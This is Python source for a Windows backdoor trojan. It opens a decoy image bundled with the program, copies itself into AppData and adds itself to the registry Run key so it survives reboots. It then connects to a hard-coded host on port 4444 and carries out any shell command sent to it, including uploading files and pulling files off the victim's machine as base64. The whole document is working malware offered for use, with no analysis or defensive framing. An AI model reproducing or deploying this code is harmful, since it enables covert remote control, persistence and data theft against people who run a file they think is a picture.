import socket
import subprocess
import json
import os
import base64
import sys
import shutil


class Backdoor:
    def __init__(self, ip, port):
        self.persist()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def persist(self):
        file_loacation = os.environ["appdata"] + "\\data.exe"
        if not os.path.exists(file_loacation):
            shutil.copyfile(sys.executable, file_loacation)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v data /t REG_SZ /d "' + file_loacation + '"', shell=True)

    def box_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def change_directory(self, path):
        os.chdir(path)
        return "[+] Changing Directory to " + path

    def box_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + str(self.connection.recv(1024))
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_command(self, command):
        null = open(os.devnull, "wb")
        return subprocess.check_output(command, shell=True, stderr=null, stdin=null)

    def read(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write(self, file_name, content):
        with open(file_name, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload Successful"

    def run(self):
        while True:
            command = self.box_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_directory(command[1])
                elif command[0] == "download":
                    command_result = self.read(command[1])
                elif command[0] == "upload":
                    command_result = self.write(command[1], command[2])
                else:
                    command_result = self.execute_command(command)
            except Exception:
                command_result = "[+] Error while running the command, please check it"
            self.box_send(command_result)

file_name = sys._MEIPASS + "/pic.jpg"
subprocess.Popen(file_name, shell=True)

try:
    backdoor_activate = Backdoor("192.168.116.146", 4444)
    backdoor_activate.run()

except Exception:
    sys.exit()